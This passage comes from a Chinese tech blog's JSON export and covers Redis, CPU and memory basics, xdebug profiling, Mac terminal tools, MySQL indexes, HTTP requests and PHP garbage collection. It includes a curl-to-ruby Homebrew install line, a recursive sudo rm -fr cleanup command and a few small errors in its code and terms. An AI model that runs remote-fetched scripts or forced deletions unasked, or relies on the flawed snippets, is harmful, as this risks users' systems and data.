&#39;hello, redis&#39;); 注意subscribe 客户端需要手动设置不超时，有两种方式： ini_set(&#39;default_socket_timeout&#39;, -1) $redis-&gt;setOption(Redis::OPT_READ_TIMEOUT, -1) 如果不设置不超时，60s后会报一个错误： 1Fatal error: Uncaught RedisException: read error on connection to 127.0.0.1:6379 方式一是通过临时修改 php.ini 配置项，default_socket_timeout默认为 60s 。 default_socket_timeout 是socket流的超时参数，即socket流从建立到传输再到关闭整个过程必须要在这个参数设置的时间以内完成，如果不能完成，那么PHP将自动结束这个socket并返回一个警告。 推荐第二种，因为方式二是通过修改redis的配置项，因此仅对redis连接生效，相对于方式一，不会产生意外的对其他部分的影响。 参考链接 php实现redis消息发布订阅","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Redis","slug":"PHP/Redis","permalink":"https://www.0x2beace.com/categories/PHP/Redis/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"}]},{"title":"《程序是怎样跑起来的》读书笔记","slug":"How-does-the-program-run-reading-notes","date":"2021-01-21T14:01:32.000Z","updated":"2021-02-03T12:47:57.415Z","comments":true,"path":"How-does-the-program-run-reading-notes/","link":"","permalink":"https://www.0x2beace.com/How-does-the-program-run-reading-notes/","excerpt":"《程序是怎样跑起来的》读书笔记","text":"《程序是怎样跑起来的》读书笔记 CPUCPU（计算机）能够直接识别和执行的只有机器语言。使用 C、Java 等语 言编写的程序，最后都会转化成机器语言。 CPU 和内存是由许多晶体管组成的电子部件，通常称为 IC (Integrated Circuit，集成电路)。 CPU 的内部由寄存器、控制器、运算器和时钟四个部分构成，各部分之间 由电流信号相互连通。 寄存器： 寄存器\u0003可用来暂存指令、数据等处理对象，可以将其看作是内存的一种。根据种类的不同，一个 CPU 内部会有20~100 个寄存器。 控制器：控制器\u0003负责把内存上的指令、数据等读入寄存器，并根据指令的执行结果来控制整个计算机。 运算器：运算器\u0003负责运算从内存读入寄存器的数据。 时钟：时钟\u0003负责发出 CPU 开始计时的时钟信号。 时钟信号英文叫作 clock puzzle。Pentium 2 GHz 表示时钟信号的频率为 2 GHz(1 GHz = 10 亿次 / 秒)。也就是说，时钟信号的频率越高，CPU 的 运行速度越快。 通常我 们将汇编语言编写的程序转化成机器语言的过程称为 汇编;反之，机器语言程序转化成汇编语言程序的过程则称为 反汇编。 高级语言编写的程序 =》经过编译转换为机器语言=》CPU内部的寄存器来进行处理。 编译指的是使用高级编程语言编写的程序转换为机器语言的过程，其中，用于转换的程序被称为编译器。 对于程序员来说，CPU 是什么呢？CPU 是具有各种功能的寄存器的集合体，所以可以将寄存器理解成是CPU 的核心，主要承担着指令、数据的处理。 二进制转十进制的方式：即各位数的数值和位权相乘后再相加的数值。 位权的概念：39 = 3 * 10 + 9 * 1 其中 10 和 1 就是位权。在十进制中，第 1 位(最右边的一位) 是 10 的 0 次幂 A(= 1)，第 2 位是 10 的 1 次幂(= 10)，第 3 位是 10 的 2 次幂(= 100)。 在二进制中，第 1 位是 2 的 0 次幂 (= 1)，第2位是2的1次幂(= 2)，这就是位权。 无论程序中使用的是多少进制，计算机最终都会转换为二进制来处理。 二进制二进制的运算方式是：对于十进制，进行加法运算时逢十进一，进行减法运算时借一当十；对于二进制，进行加法运算时逢二进一，进行减法运算时借一当二。 二进制数中表示负数值时，一般会把最高位作为符号来使用，因此我们把这个最高位称为符号位。 符号位是 0 时表示正数 ，符号位是 1 时表示负数。 将二进制数的值取反后加 1 的结果，和原来的值相加，结果为0 。实际上就是1 + (-1) = 0 计算机进行小数运算 为什么将0.1 累加一百次无法得到 10？ 这是因为计算机无法准确用二进制表示 0.1， 十进制的0.1 转换成二进制后，会变成0.00011001100...(1100 循环)这样的 循环小数，这和无法用十进制准确表示 1/3 一样的道理。 因此，在 遇到循环小数时，计算机就会根据变量数据类型所对应的长度将数值 从中间截断或者四舍五入。 小 数 点 后 4 位 用 二 进 制 数 表 示 时 的 数 值 范 围 为 0.0000~0.1111。因此，这里只能表示 0.5、0.25、0.125、0.0625 这四个 二进制数小数点后面的位权组合而成(相加总和)的小数。 所以0.5 累加一百次可以到的 50，而0.1 累加一百次则会丢失精度。 二进制和十进制在实际的程序中，往往不会直接使用二进制来表示，因为太长了，一个二进制就需要八位来表示。 二进制数的 4 位，正好相当于十六进制数的 1 位。 内存其实，从物理上来看，内存的构造非常简单。只要在程序上花一些心思，就可以将内存变换成各种各样的数据结构来使用。 内存实际上是一种名为内存 IC 的电子元件。 内存 IC 中有电源、地址信号、数据信号、控制信号等用于输入输出的大量引脚(IC 的引脚)，通过为其指定地址(address)，来进行数据的读写。 那么，这个内存IC 中能存放多少数据呢？ 数据信号引脚有 D0~D7共八个，表示一次可以输入输出 8 位(= 1 字节)的数据。 地址信号引脚有 A0A9 共十个，表示可以指定 `00000000001111111111` 共1024 个地址。 而地址是用来表示数据的存储场所，因此我们可以得出这 A个内存 IC 中可以存储 1024 个 1 字节的数据。因为 1024 = 1K，所以改内存IC 的容量是1KB。 指针指针也是一种变量，它所表示的不是数据的值，而是存储着数据的内存的地址。 通过使用指针，就可以对任意指定地址的数据进行读写。 数组的定义中所指定的数据类型，也表示一次能够读写的内存大小。 高级编程语言的数组则完全省略了这些概念，直接定义一个数组，就可以放入任意类型的数据（int、float、double、string、object等）。 指针的概念也是类似，指针的数据类型表示一次可以读写的长度。 栈、队列及环形缓冲区栈的原意是“干草堆积如山”。干草堆积成山后，最后堆的干草会 被最先抽取出来（后进先出）。 而队列则是完全相反的一种数据结构，先进先出。 内存和磁盘不读入内存就无法运行计算机中主要的存储部件是内存和磁盘。磁盘中存储的程序，必须要加载到内存后才能运行。 为什么程序一定要在内存中运行？ 这是因为，这是因为负责解析和运行程序内容的CPU，需要通过内部程序计数器来指定内存地址，然后才能读出地址。 即使CPU 可以直接读出并运行磁盘中保存的程序，由于磁盘读取速度慢，程序的运行速度还是会降低。 本文中的所有图片均来自《程序是如何跑起来的》。 磁盘缓存加速了磁盘访问速度磁盘缓存指的是把从磁盘中读取的数据存储到内存中的方式。 磁盘访问提高访问速度的机制： 虚拟内存把磁盘作为部分内存来使用虚拟内存是把磁盘作为假象的内存来使用。这与磁盘缓存是假象的磁盘（实际是内存）是相对的，虚拟内存是假象的内存（实际是磁盘）。 亲自尝试压缩数据文件是将数据存储在磁盘等存储媒介中的一种形式，程序文件中存储数据的单位是字节。 我们把能还原到压缩前状态的压缩称为 可逆压缩，无法还原到压 缩前状态的压缩称为 非可逆压缩。 从源文件到可执行文件在程序运行时，用来动态申请分配数据和对象的内存区域形式称为堆。 源代码编译 =》本地代码（机器代码）=》dump（每个字节用 2 位十六进制数来表示的方式） 仅靠编译是无法得到可执行文件的，编译器编译仅仅只是得到了本地文件，为了得到可执行文件，还需要进行”链接“处理。 编译在Windows 下，编译后生成的不是 EXE 文件，而是扩展名为.obj的目标文件，在Unix 下，编译后生成的也不是可执行文件，而是扩展名为.o 的目标文件。 这些文件无法直接运行，这是因为编译过程只是检查语法（函数、变量的声明）是否正确。 Mac 下编译main.cpp 文件： 123$ gcc -c main.cpp$ ls main.cpp main.o 链接找到所要用到函数所在的目标文件并结合，生成一个可执行文件的处理就是链接，运行连接的程序被称为链接器。 Mac 下链接main.o 文件： 12$ gcc main.o -o main$ main.cpp main.o main 两步可以合并成一步： 123$ gcc main.cpp$ ls main.cpp a.out 总结： main.cpp：源代码文件 main.o：源代码文件编译后生成的本地代码（机器语言） main：可执行文件 a.out：可执行文件（默认名称） 当程序加载到内存后，除此之外还会额外生成两个组，那就是堆和栈。 栈是用来存储函数内部临时使用的变量（局部变量），以及函数调用时所用的参数的内存区域。堆是用来存储程序运行时的任意数据及对象的内存领域。 无论是 C 语言还是 C++，如果没有在程序中明确释放堆的内存空间，那么即使在处理完毕后，该内存空间仍会一直残留。这个现象称为 内存泄露。 编译器和解析器的区别？编译器是在程序运行之前对所有源代码进行解释处理。解析器则是在运行时对源代码的内容一行一行地进行解释处理。 操作系统和应用的关系操作系统本身并不是单独的程序，而是多个程序的集合体。 初期的操作系统 = 监控程序 + 基本的输入输出程序 在操作系统这个运行环境下，应用并不能直接控制硬件，而是通过操作系统来间接控制硬件。 应用程序经过 OS 间接地控制硬件： 高级语言的可移植性和系统调用C 语言等高级编程语言并不依存特定的操作系统。这是因为用高级编程语言编写的应用在编译后，就转换成了利用系统调用的本地代码。 高级语言编写的函数调用在编译之后变成了系统调用： 通过汇编语言了解程序的实际构成前面的章节已经多次提到了，计算机CPU 能直接解释运行的只有本地代码（机器语言）程序。 用C 语言等高级编程语言编写的源代码，需要通过各自的编译器编译后，转换成本地代码。 通过调查本地代码的内容，可以了解程序最终是以何种形式来运行的。但是，如果直接打开本地代码来看的话，只能看到数值的罗列。 如果直接使用这些数值来编写程序的话，还真是不太容易理解。因而 就产生了这样一种想法，那就是在各本地代码中，附带上表示其功能的英语单词缩写。 例如，在加法运算的本地代码中加上 add(addition 的缩写)、在比较运算的本地代码中加上 cmp(compare 的缩写)等。这些缩写称为 助记符，使用助记符的编程语言称为 汇编语言。 不过，即使是用汇编语言编写的源代码，最终也必须转换成本地代码才能运行。负责转换工作的程序称为汇编器，转换这一处理本身称为汇编。 用汇编语言编写的源代码，和本地代码是一一对应的。因而，本地代码也可以反过来转换成汇编语言的源代码。持有该功能的逆变换程序称为 反汇编程序，逆变换这一处理本身称为反汇编。","categories":[{"name":"读书笔记","slug":"读书笔记","permalink":"https://www.0x2beace.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"https://www.0x2beace.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}]},{"title":"PHP + xdebug 分析代码性能瓶颈","slug":"php-analysis-code-performance-bottleneck","date":"2021-01-19T12:12:54.000Z","updated":"2021-01-19T12:16:37.417Z","comments":true,"path":"php-analysis-code-performance-bottleneck/","link":"","permalink":"https://www.0x2beace.com/php-analysis-code-performance-bottleneck/","excerpt":"通常启用了xdebug插件，性能测试输出文件会伴随生成，通常是以cachegrind.out.xxxx 文件存在。","text":"通常启用了xdebug插件，性能测试输出文件会伴随生成，通常是以cachegrind.out.xxxx 文件存在。 该文件可以通过第三方工具来进行代码性能分析。 但如果本地有多个项目/网站，所有的profile 都输出到一个文件中了，这样并不方便后面进行性能分析。 自定义profile 文件名称可以通过配置xdebug.profiler_output_name 参数来设置输出文件名称，部分参数如下： 符号 含义 配置样例 样例文件名 %c 当前工作目录的crc32校验值 cachegrind.out.%c cachegrind.out.1258863198 %p 当前服务器进程的pid cachegrind.out.%p cachegrind.out.9685 %r 随机数 cachegrind.out.%r cachegrind.out.072db0 %s 脚本文件名(注) cachegrind.out.%s cachegrind.out._home_httpd_html_test_xdebug_test_php %t Unix时间戳（秒） cachegrind.out.%t cachegrind.out.1179434742 %u Unix时间戳（微秒） cachegrind.out.%u cachegrind.out.1179434749_642382 %H $_SERVER[‘HTTP_HOST’] cachegrind.out.%H cachegrind.out.localhost %R $_SERVER[‘REQUEST_URI’] cachegrind.out.%R cachegrind.out._test_xdebug_test_php_var=1_var2 %S session_id (来自$_COOKIE 如果设置了的话) cachegrind.out.%S cachegrind.out.c70c1ec2375af58f74b390bbdd2a679d %% %字符 cachegrind.out.%% cachegrind.out.%% 编辑php.ini 配置文件： 1xdebug.profiler_output_name &#x3D; cachegrind.out.%H 然后重启 php server。 在Mac 下，profile 文件存放于/var/tmp/目录中。 性能分析在Mac 下，有MacCallGrind 和 qcachegrind 可以使用，不过前者是收费，直接通过Apple Store下载，后者是免费。需要手动安装。 安装graphviz，用来Call Graph功能： 1$ brew install graphviz 安装 qcachegrind： 1$ brew install qcachegrind 安装完成之后，就可以打开 qcachegrind 应用了，图形界面如下： 其他不过需要注意，开启了profile文件输出之后，如果本地项目多的话，很容易占用磁盘大面积空间，下图是我半年左右没有清理的状态： 可以使用命令进行清理： 1$ sudo rm -fr &#x2F;private&#x2F;var&#x2F;tmp&#x2F;cachegrind.out.* 参考链接 使用xdebug对php进行profile的输出 php+xdebug+qcachegrind(mac)性能分析","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"Mac 下有哪些好用的终端工具","slug":"what-are-some-useful-terminal-tools-under-Mac","date":"2021-01-12T14:33:12.000Z","updated":"2021-04-03T09:42:07.392Z","comments":true,"path":"what-are-some-useful-terminal-tools-under-Mac/","link":"","permalink":"https://www.0x2beace.com/what-are-some-useful-terminal-tools-under-Mac/","excerpt":"这篇笔记主要是用来整理自己一直在使用的一些较为好用的终端工具/扩展。","text":"这篇笔记主要是用来整理自己一直在使用的一些较为好用的终端工具/扩展。 因为我个人的终端配置是ZSH + iTerm2，所以本文的部分ZSH 扩展可能不适用于其他Shell用户。 brew经常与终端打交道的用户，对这个一定不陌生，它就是类似Ubuntu下的apt-get这样的包管理工具。 通常我需要搭建一个全新的开发环境时，它一定是第一个需要安装的工具。 安装 brew（brew 官网） 1ruby -e &quot;$(curl -fsSL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Homebrew&#x2F;install&#x2F;master&#x2F;install)&quot; 常用命令如下：常用命令如下：| 命令 | 描述 ||— | — ||brew search package | 搜索软件包||brew install package | 安装软件包||brew uninstall package | 卸载软件包||brew list | 列出已安装清单||brew help | 获取帮助| OSX 扩展osx 扩展是zsh 提供的一个控制终端和访达（功能之一）的扩展工具。 其中最为常用是ofd命令，将当前shell窗口在访达中打开。 另一个较为常用的命令是cdf，可在shell中直接跳转至当前访达窗口所在的路径（如果存在多个访达窗口，那么跳转至最前面的那个）。 其他常用命令如下： 命令 描述 tab 在当前目录打开一个新窗口 split_tab 在当前窗口打开一个水平窗口 vsplit_tab 在当前窗口打开一个垂直窗口 ofd 在访达窗口中打开当前目录 pfd 返回最前面的访达窗口的路径 pfs 返回当前查找程序选择 cdf cd 到当前访达窗口所在的路径 pushdf pushed 到当前访达目录 quick-look 快速查看指定文件 man-preview 在预览应用程序中打开特定的手册页 showfiles 显示隐藏文件 hidefiles 隐藏隐藏的文件 rmdsstore 以递归方式删除目录中的.DS_Store文件 tmuxtmux 是一个终端下窗口分割的工具，有关它的具体介绍，请查阅这篇笔记。 autojumpautojump - 目录快速跳转命令行工具，从此告别cd... cd...。 autojump 是一个Windows、Linux、macOS 都能使用的命令行工具，这是仅介绍macOS 的安装方式。 1brew install autojump 使用brew安装完成之后，还需要进行配置，以下方法二选一： 在 ~/.bash_profile 文件中加入语句 [[ -s $(brew --prefix)/etc/profile.d/autojump.sh ]] &amp;&amp; . $(brew --prefix)/etc/profile.d/autojump.sh。 在 ~/.zshrc 文件中，修改 plugins=(git) 插件配置行，以开启 zsh 对 autojump 插件的支持 plugins=(git autojump)。 常用命令 命令 描述 j foo 跳转到包含 foo 的目录 jc bar 跳转到包含 bar 的子目录 jo file 在访达中打开包含 file 的目录 autojump –help 打开帮助列表 Spaceship ZSHSpaceship ZSH——是一个极简、强大和可定制的ZSH提示符。 我是在无意间发现的这个终端工具的，先来看一下实际效果。 特点Spaceship ZSH 有很多很棒的特点，这里仅仅列举一些我所看见的。 颜值即正义 展示当前Git 仓库的状态 展示各种语言的当前版本 展示最后一条命令的总执行时间 安装Spaceship ZSH 的安装方式有多种，这里仅介绍通过oh-my-zsh的安装方式，其他方式可参考官网。 克隆仓库1git clone https:&#x2F;&#x2F;github.com&#x2F;denysdovhan&#x2F;spaceship-prompt.git &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&quot; 将spaceship.zsh-theme 链接到oh-my-zsh 的主题目录1ln -s &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&#x2F;spaceship.zsh-theme&quot; &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship.zsh-theme&quot; 编辑~/.zshrc1ZSH_THEME&#x3D;&quot;spaceship&quot; tldrtldr 是一个比man 更好用的命令行手册。 它衍生出了各种语言的客户端，这里直接使用官网推荐的方式进行安装： 1npm install -g tldr 安装完成之后，第一次使用tldr命令需要下载相关依赖： 123tldr tarPage not found. Updating cache...Error: connect ECONNREFUSED 127.0.0.1:443 如果出现上面这个输出，表示命令行需要使用代理，如果不知道如何设置，可以参考这篇笔记。 正常输出如下： 123456789101112131415161718192021222324252627282930313233tldr tar✔ Page not found. Updating cache...✔ Creating index... tar Archiving utility. Often combined with a compression method, such as gzip or bzip. More information: https:&#x2F;&#x2F;www.gnu.org&#x2F;software&#x2F;tar. - [c]reate an archive from [f]iles: tar cf target.tar file1 file2 file3 - [c]reate a g[z]ipped archive from [f]iles: tar czf target.tar.gz file1 file2 file3 - [c]reate a g[z]ipped archive from a directory using relative paths: tar czf target.tar.gz --directory&#x3D;path&#x2F;to&#x2F;directory . - E[x]tract a (compressed) archive [f]ile into the current directory: tar xf source.tar[.gz|.bz2|.xz] - E[x]tract a (compressed) archive [f]ile into the target directory: tar xf source.tar[.gz|.bz2|.xz] --directory&#x3D;directory - [c]reate a compressed archive from [f]iles, using [a]rchive suffix to determine the compression program: tar caf target.tar.xz file1 file2 file3 - Lis[t] the contents of a tar [f]ile [v]erbosely: tar tvf source.tar - E[x]tract [f]iles matching a pattern: tar xf source.tar --wildcards &quot;*.html&quot; 上面那个node 的客户端不是交互式的，如果需要自动的，可以使用 tldr++，这是一个Go 语言编写的交互式客户端。 参考链接 安装 zsh 如何启用 zsh 的插件 OSX 插件 Spaceship ZSH autojump——自动跳转文件目录 tldr——比man 更好用的命令行手册","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"},{"name":"Mac","slug":"Tutorial/Mac","permalink":"https://www.0x2beace.com/categories/Tutorial/Mac/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Mysql 索引设计与优化","slug":"mysql-index-design-and-optimization","date":"2021-01-10T13:12:04.000Z","updated":"2021-01-10T13:13:04.486Z","comments":true,"path":"mysql-index-design-and-optimization/","link":"","permalink":"https://www.0x2beace.com/mysql-index-design-and-optimization/","excerpt":"什么是索引？","text":"什么是索引？ 数据库索引是一种数据结构，它以额外的写入和存储空间为代价来提高数据库表上数据检索操作的速度。通俗来说，索引类似于书的目录，根据其中记录的页码可以快速找到所需的内容。——维基百科 常见索引有哪些？ 普通索引：最基本的索引，没有任何限制 唯一索引：与”普通索引“类似，不同的就是：索引列的值必须是唯一，但允许有空值 主键索引：它是一种特殊的索引，不允许有空值 全文索引：仅可用于 MyISAM 表，针对较大的数据，生成全文索引很耗时占空间 组合索引：为了提高多条件查询效率，可建立组合索引，遵循”最左前缀匹配原则“ 这里以相对复杂的组合为例，介绍如何优化。 最左前缀匹配原则首先我们要知道什么是最左前缀匹配原则。 最左前缀匹配原则是指在使用 B+Tree 联合索引进行数据检索时，MySQL 优化器会读取谓词（过滤条件）并按照联合索引字段创建顺序一直向右匹配直到遇到范围查询或非等值查询后停止匹配，此字段之后的索引列不会被使用，这时计算 key_len 可以分析出联合索引实际使用了哪些索引列。 如何计算 key_len通过 key_len 计算也帮助我们了解索引的最左前缀匹配原则。 key_len 表示得到结果集所使用的选择索引的长度[字节数]，不包括 order by，也就是说如果 order by 也使用了索引则 key_len 不计算在内。 在计算 key_len 之前，先来温习一下基本数据类型（以UTF8 编码为例）：|类型|所占空间|不允许为NULL额外占用||-|-|-||char|一个字符三个字节|一个字节||varchar|一个字符三个字节|一个字节||int|四个字节|一个字节||tinyint|一个字节|一个字节| 测试数据表如下： 12345678CREATE TABLE &#96;test_table&#96; ( &#96;id&#96; int(11) NOT NULL AUTO_INCREMENT, &#96;a&#96; int(11) DEFAULT NOT NULL, &#96;b&#96; int(11) DEFAULT NOT NULL, &#96;c&#96; int(11) DEFAULT NOT NULL, PRIMARY KEY (&#96;id&#96;), KEY &#96;test_table_a_b_c_index&#96; (&#96;a&#96;,&#96;b&#96;,&#96;c&#96;)) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8; 命中索引： 123456mysql&gt; explain select * from test_table where a &#x3D; 1 and b &#x3D; 2 and c &#x3D; 3;+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+| id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra |+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+| 1 | SIMPLE | test_table | NULL | ref | test_table_a_b_c_index | test_table_a_b_c_index | 12 | const,const,const | 1 | 100.00 | Using index |+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+ 可以看到 key_len = 12，这是如何计算的呢？因为字符集是 UTF8，一个字段占用四个字节，三个字段就是 4 * 3 = 12 字节。 是否允许为 NULL，如果允许为 NULL，则需要用额外的字节来标记该字段，不同的数据类型所需的字节大小不同。 123456789mysql&gt; ALTER TABLE &#96;test_table&#96; CHANGE &#96;a&#96; &#96;a&#96; INT(11) NULL;mysql&gt; ALTER TABLE &#96;test_table&#96; CHANGE &#96;c&#96; &#96;c&#96; INT(11) NULL;mysql&gt; ALTER TABLE &#96;test_table&#96; CHANGE &#96;b&#96; &#96;b&#96; INT(11) NULL;mysql&gt; explain select * from test_table where a &#x3D; 1 and b &#x3D; 2 and c &#x3D; 3;+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+| id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra |+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+| 1 | SIMPLE | test_table | NULL | ref | test_table_a_b_c_index | test_table_a_b_c_index | 15 | const,const,const | 1 | 100.00 | Using index |+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+ 可以看到，当字段允许为空时，这时的key_len 变成了15 = 4 * 3 + 1 * 3（INT 类型为空时，额外占用一个字节）。 索引优化有了这些基础知识之后，再来根据实际的SQL 判断索性性能好坏。 还是以上面那张数据表为例，为 a、b、c 三个字段创建联合索引。|SQL 语句|是否索引||-|-||explain select * from test_table where a = 1 and b = 2 and c = 3;|Extra:Using index key_len: 15||explain select * from test_table where a = 1 and b = 2 and c = 3 order by c;|Extra:Using index key_len: 15||explain select * from test_table where b = 2 and c = 3;|Extra:Using where; Using index key_len: 15||explain select * from test_table where a = 1 order by c;|Extra:Using where; Using index; Using filesort key_len: 5||explain select * from test_table order by a, b, c;|Extra:Using index key_len: 15||explain select * from test_table order by a, b, c desc;|Extra:Using index; Using filesort key_len:15||explain select * from test_table where a in (1,2) and b in (1,2,3) and c = 1;|Extra:Using where; Using index key_len: 15| 通常在查看执行计划时， Extra 列为 Using index 则表示优化器使用了覆盖索引。 SQL1 可以使用覆盖索引，性能好 SQL2 可以使用覆盖索引，同时避免排序，性能好 SQL3 可以使用覆盖索引，但是需要根据 where 字句进行过滤 SQL4 可以使用部分索引 a，但无法避免排序，性能差 SQL5 可以完全使用覆盖索引，同时可以避免排序，性能好 SQL6 可以使用覆盖索引，但无法避免排序，（这是因为 MySQL InnoDB 创建索引时默认asc升序，索引无法自动倒序排序） SQL7 可以使用覆盖索引，但是需要根据 where 子句进行过滤（非定值查询） 创建索引规范 考虑到索引维护的成本，单张表的索引数量不超过 5 个，单个索引中的字段数不超过 5 个 不在低基数列上建⽴索引，例如“性别”。 在低基数列上创建的索引查询相比全表扫描不一定有性能优势，特别是当存在回表成本时。 合理创建联合索引，(a,b,c) 相当于 (a) 、(a,b) 、(a,b,c)。 合理使用覆盖索引减少IO，避免排序。 参考链接 Explain之key_len长度计算","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"一次完整的网络请求过程","slug":"a-complete-network-request-process","date":"2021-01-06T15:41:25.000Z","updated":"2021-02-25T11:54:22.940Z","comments":true,"path":"a-complete-network-request-process/","link":"","permalink":"https://www.0x2beace.com/a-complete-network-request-process/","excerpt":"在浏览器中输入 www.0xbeace.com 这个域名，然后就能看到精美的页面了，这中间倒底发生了些什么呢？","text":"在浏览器中输入 www.0xbeace.com 这个域名，然后就能看到精美的页面了，这中间倒底发生了些什么呢？ 其整个过程大致可以分为以下几个步骤： DNS 域名解析，寻找对应的IP 地址 根据这个IP 找到对应的服务器，建立TCP 连接（三次握手） TCP 建连之后，发起HTTP 请求 服务器响应 HTTP 请求 客户端接收数据解析并渲染页面 服务器关闭TCP 连接（四次挥手） 域名解析以0xbeace.com这个域名为例，DNS 域名解析大致可以细分成以下几个小步骤： DNS 缓存（这里的缓存分为浏览器和操作系统） 本地域名服务器（Hosts 文件） 根域名服务器 COM 顶级域名服务器 0xbeace.com 域名服务器 域名解析一般就是按照该过程去查找，这里引用一张图（没找到具体出处），更加通俗易懂地解释了完整地解析过程。 DNS 域名解析详细过程 TCP 建连客户端发起请求TCP 连接成功之后，就可以按照固定格式向服务器发起请求了。 一个完整的 HTTP 请求应该包含以下几部分： 请求行：用于描述客户端的请求方式（GET/POST等），请求的资源名称(URL)以及使用的HTTP协议的版本号 请求头：用于描述客户端请求哪台主机及其端口，以及客户端的身份信息（User-Agent）等 请求正文：客户端需要发送给服务端的数据 服务端响应请求客户端成功发起请求之后，客户端接收请求并处理将结果响应至客户端。 一个完整的 HTTP 响应应该包含以下几个部分： 状态行：如：HTTP/1.1 200 ok，分别表示 http版本 + 状态码 + 状态代码的文本描述 响应头：包含服务器相关信息 响应正文：服务器返回给客户端的数据 客户端渲染这里以最常见的 .html 文件为例，当客户端接收到响应数据之后，便开始解析 HTML，如果遇到js/css这类静态资源，就会向服务器发起一个HTTP 请求，如果该请求的返回状态码是 304（已经缓存在本地浏览器了），就会直接从缓存中获取，否则就会开启新的线程去向服务器请求下载。 这时就用到了 keep-alive 这个特性，可以建立一次TCP 连接，发起多次 HTTP 请求。 然后浏览器再利用自己的内部工作机制，将HTML 与静态资源进行渲染，最后呈现给用户。 TCP 关闭连接一般情况下，服务端向客户端完成一次请求，就会关闭TCP 连接，那么下一次又需要发起 HTTP 请求时，就需要再次建立一次TCP 连接了。 频繁建立/关闭连接，不仅增加了请求响应时间，还额外增加了网络带宽消耗，所以HTTP 协议为我们提供了一个可以保持TCP 的通用消息头： 1Connection:keep-alive 至此一个完整的HTTP 请求就完成了。 其他问题为什么HTTP 协议要基于TCP 来实现这是因为TCP 是一个端到端的面向连接的协议，HTTP基于传输层TCP协议不用担心数据传输的各种问题（当发生错误时，会重传）。 参考链接 一次完整的HTTP请求过程 一次完整的网络请求是怎么样的？","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"}]},{"title":"PHP 垃圾回收机制","slug":"php-garbage-collection-mechanism","date":"2021-01-04T14:44:06.000Z","updated":"2021-02-03T08:32:46.856Z","comments":true,"path":"php-garbage-collection-mechanism/","link":"","permalink":"https://www.0x2beace.com/php-garbage-collection-mechanism/","excerpt":"PHP 是一门托管型语言，在PHP 编程时，程序员不需要手动处理内存资源的分配和释放，这就意味着 PHP 本身实现了垃圾回收机制（Garbage Collection）。","text":"PHP 是一门托管型语言，在PHP 编程时，程序员不需要手动处理内存资源的分配和释放，这就意味着 PHP 本身实现了垃圾回收机制（Garbage Collection）。 垃圾回收机制是什么？ 垃圾回收是一种自动的存储器管理机制，当某个程序占用的一部分内存空间不再被这个程序所访问时，这个程序会借助垃圾回收算法自动向操作系统归还这部分的内存空间。 PHP 引用计数定义一个PHP 变量如下： 1234&lt;?php$str &#x3D; &quot;boo&quot;;$str_bak &#x3D; $var;unset($str); 上面这几行代码分别做了如下事情： 第一行代码创建了一个字符串变量，申请了一个大小为 三个字节的内存空间，保存了字符串 boo 和一个 NULL(\\0)的结尾。 第二行代码定义了一个新的字符串变量，并将变量str的值复制给了这个新的变量。 第三行 unset 掉了变量 str 这样的代码在很常见，如果PHP 对于每一个变量赋值都重新分配内存，copy 数据的话，那么上面的那段代码就需要共申请六个字节的内存空间，而我们也很容易看出来，其实完全没有必要申请两份空间。 PHP中的变量是用一个存储在 symbol_table 中的符号名，对应一个 zval 变量容器来实现的，比如对于上面的第一行代码，会在 symbol_table 中存储一个值 str, 对应的有一个指针指向一个 zval结构，变量值 boo 保存在这个变量容器中，所以不难想象，对于上面的代码来说，我们完全可以让 str 和 str_bak 对应的指针都指向同一个变量容器就可以了。 PHP 也是这样做的，这是就需要介绍 zval变量容器的结构了。 每个变量存在一个叫做zval的变量容器中。一个zval变量容器，除了包含变量的类型和值，还包括两个字节的额外信息： is_ref：bool 值，用来标示这个变量是否属于引用集合（reference_set）。通过这个字节，PHP 引擎才能把普通变量和引用变量区分开来。 refcount：用以表示指向这个 zval 变量容器的变量个数。 1. 查看内部结构当一个变量被赋值时，就会生成一个zval变量容器： 123&lt;?php$str &#x3D; &quot;hello, php&quot;;xdebug_debug_zval(&#39;str&#39;); 在 PHP 中可以通过 xdebug 扩展中提供的方法xdebug_debug_zval()来查看变量的计数变化。 输出结果 1str:(refcount&#x3D;1, is_ref&#x3D;0)string &#39;hello, php&#39; (length&#x3D;10) 2. 增加引用次数把一个变量赋值给另一个变量将增加引用次数（refcount + 1）： 123$str &#x3D; &quot;hello, php&quot;;$str2 